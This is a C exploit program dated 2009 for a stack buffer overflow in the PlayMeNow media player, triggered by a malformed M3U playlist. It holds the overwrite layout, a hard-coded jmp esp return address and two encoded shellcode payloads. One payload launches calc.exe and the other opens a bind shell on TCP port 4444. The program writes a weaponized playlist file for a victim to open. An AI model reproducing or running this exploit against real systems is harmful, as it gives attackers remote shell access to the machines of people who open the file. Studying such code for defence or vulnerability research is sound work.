/*
	[+] Vulnerability:			PlayMeNow Malformed M3U Playlist File Buffer Overflow 
	[+] Product:				PlayMeNow - media player.
	[+] Versions affected:		Tested with 7.3 and 7.4
	[+] Tested on:				Windows XP Professional with Service Pack 2
	[+] Author:					Gr33nG0bL1n
	[+] Software Link:			http://playmenow.gooofull.com/ 
	[+] Date:				19/12/2009
	[+] Usage:					Just choose your shellcode and open the created file(PlayMeNow_expl.m3u) with PlayMeNow.
	

Started Like this:
			EAX 00000000
			ECX 7C80C755 kernel32.7C80C755
			EDX 00000000
			EBX 00000000
			ESP 0012F5B8 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
			EBP 0012FAE8 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
			ESI 00194810
			EDI 001A4600
			EIP 41414141
	
Ended with this:
			exploit : [A x 1040] +[EIP - jmp esp] + [Nops -20] + [Shellcode]
*/

#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<windows.h>


/*
	windows/exec
	http://www.metasploit.com
	Encoder: x86/shikata_ga_nai
	EXITFUNC=thread, CMD=calc
*/
char calc_shcode[] =	"\x31\xc9\xda\xd4\xb1\x33\xbd\xec\x71\x94\xde\xd9\x74\x24\xf4"
						"\x5f\x31\x6f\x15\x03\x6f\x15\x83\x2b\x75\x76\x2b\x4f\x9e\xff"
						"\xd4\xaf\x5f\x60\x5c\x4a\x6e\xb2\x3a\x1f\xc3\x02\x48\x4d\xe8"
						"\xe9\x1c\x65\x7b\x9f\x88\x8a\xcc\x2a\xef\xa5\xcd\x9a\x2f\x69"
						"\x0d\xbc\xd3\x73\x42\x1e\xed\xbc\x97\x5f\x2a\xa0\x58\x0d\xe3"
						"\xaf\xcb\xa2\x80\xed\xd7\xc3\x46\x7a\x67\xbc\xe3\xbc\x1c\x76"
						"\xed\xec\x8d\x0d\xa5\x14\xa5\x4a\x16\x25\x6a\x89\x6a\x6c\x07"
						"\x7a\x18\x6f\xc1\xb2\xe1\x5e\x2d\x18\xdc\x6f\xa0\x60\x18\x57"
						"\x5b\x17\x52\xa4\xe6\x20\xa1\xd7\x3c\xa4\x34\x7f\xb6\x1e\x9d"
						"\x7e\x1b\xf8\x56\x8c\xd0\x8e\x31\x90\xe7\x43\x4a\xac\x6c\x62"
						"\x9d\x25\x36\x41\x39\x6e\xec\xe8\x18\xca\x43\x14\x7a\xb2\x3c"
						"\xb0\xf0\x50\x28\xc2\x5a\x3e\xaf\x46\xe1\x07\xaf\x58\xea\x27"
						"\xd8\x69\x61\xa8\x9f\x75\xa0\x8d\x40\x94\x61\xfb\xe8\x01\xe0"
						"\x46\x75\xb2\xde\x84\x80\x31\xeb\x74\x77\x29\x9e\x71\x33\xed"
						"\x72\x0b\x2c\x98\x74\xb8\x4d\x89\x16\x5f\xde\x51\xf7\xfa\x66"
						"\xf3\x07";


/*
	windows/shell_bind_tcp
	http://www.metasploit.com
	Encoder: x86/shikata_ga_nai
	EXITFUNC=thread, LPORT=4444, RHOST=
*/
char bind_shcode[] =	"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7"
						"\x82\xf8\x80\x83\xeb\xfc\xe2\xf4\x0b\xe8\x13\xcd\x1f\x7b\x07\x7f"
						"\x08\xe2\x73\xec\xd3\xa6\x73\xc5\xcb\x09\x84\x85\x8f\x83\x17\x0b"
						"\xb8\x9a\x73\xdf\xd7\x83\x13\xc9\x7c\xb6\x73\x81\x19\xb3\x38\x19"
						"\x5b\x06\x38\xf4\xf0\x43\x32\x8d\xf6\x40\x13\x74\xcc\xd6\xdc\xa8"
						"\x82\x67\x73\xdf\xd3\x83\x13\xe6\x7c\x8e\xb3\x0b\xa8\x9e\xf9\x6b"
						"\xf4\xae\x73\x09\x9b\xa6\xe4\xe1\x34\xb3\x23\xe4\x7c\xc1\xc8\x0b"
						"\xb7\x8e\x73\xf0\xeb\x2f\x73\xc0\xff\xdc\x90\x0e\xb9\x8c\x14\xd0"
						"\x08\x54\x9e\xd3\x91\xea\xcb\xb2\x9f\xf5\x8b\xb2\xa8\xd6\x07\x50"
						"\x9f\x49\x15\x7c\xcc\xd2\x07\x56\xa8\x0b\x1d\xe6\x76\x6f\xf0\x82"
						"\xa2\xe8\xfa\x7f\x27\xea\x21\x89\x02\x2f\xaf\x7f\x21\xd1\xab\xd3"
						"\xa4\xd1\xbb\xd3\xb4\xd1\x07\x50\x91\xea\xe9\xdc\x91\xd1\x71\x61"
						"\x62\xea\x5c\x9a\x87\x45\xaf\x7f\x21\xe8\xe8\xd1\xa2\x7d\x28\xe8"
						"\x53\x2f\xd6\x69\xa0\x7d\x2e\xd3\xa2\x7d\x28\xe8\x12\xcb\x7e\xc9"
						"\xa0\x7d\x2e\xd0\xa3\xd6\xad\x7f\x27\x11\x90\x67\x8e\x44\x81\xd7"
						"\x08\x54\xad\x7f\x27\xe4\x92\xe4\x91\xea\x9b\xed\x7e\x67\x92\xd0"
						"\xae\xab\x34\x09\x10\xe8\xbc\x09\x15\xb3\x38\x73\x5d\x7c\xba\xad"
						"\x09\xc0\xd4\x13\x7a\xf8\xc0\x2b\x5c\x29\x90\xf2\x09\x31\xee\x7f"
						"\x82\xc6\x07\x56\xac\xd5\xaa\xd1\xa6\xd3\x92\x81\xa6\xd3\xad\xd1"
						"\x08\x52\x90\x2d\x2e\x87\x36\xd3\x08\x54\x92\x7f\x08\xb5\x07\x50"
						"\x7c\xd5\x04\x03\x33\xe6\x07\x56\xa5\x7d\x28\xe8\x07\x08\xfc\xdf"
						"\xa4\x7d\x2e\x7f\x27\x82\xf8\x80";


int main ( int argc , char * argv[])

{

	FILE *fp;
	char *EIP = "\x5D\x38\x82\x7C"; //KERNEL32.DLL
	int i;
	int sc_opt =0;


	system("cls");
	printf("\t. .. ...PlayMeNow 7.4 m3u File Buffer Overflow... .. .\r\n");
	printf("Usage:\r\n");
	printf("\t[1] execute calc.exe\n");
	printf("\t[2] execute bindshell LPORT=4444\n\n");


	printf("Choose shellcode: <1/2>\r\n");
	scanf("%d" , &sc_opt );

	if( (fp=fopen("PlayMeNow_expl.m3u","wb")) ==NULL )
	{
         perror("cannot open expl file!");
         exit(0);
	}


	switch(sc_opt)
	{
		case 1:
				for (i=0; i<1040; i++)
				{
					fwrite("\x41", 1, 1, fp);  //Junk
				}
				
				fwrite(EIP, 4, 1, fp); // We are flying baby.....

				for (i=0; i<20; i++)
				{
					fwrite("\x90", 1, 1, fp);// Nop's
				}
									   
				fwrite(calc_shcode, sizeof(calc_shcode), 1, fp); //Party Time

				fclose(fp);
                printf("[+] PlayMeNow_expl.m3u Created\r\n");
				printf("[+] Shellcode: Calc.exe\r\n");
				printf("[+] Enjoy\r\n");
				printf("[+] Exploited By Gr33nG0bL1n\r\n");
				break;
                   
        case 2:
				for (i=0; i<1040; i++)
				{
					fwrite("\x41", 1, 1, fp);// Junk
				}
				
				fwrite(EIP, 4, 1, fp); // We are flying baby.....

				for (i=0; i<20; i++)
				{
					fwrite("\x90", 1, 1, fp); //Nop's
				}
									   
				fwrite(bind_shcode, sizeof(bind_shcode), 1, fp); //Party Time

				fclose(fp);
                printf("[+] PlayMeNow_expl.m3u Created\r\n");
				printf("[+] Shellcode: bindshell port 4444\r\n");
				printf("[+] Enjoy\r\n");
				printf("[+] Exploited By Gr33nG0bL1n\r\n");
                break;
    }
	return 0;
			
}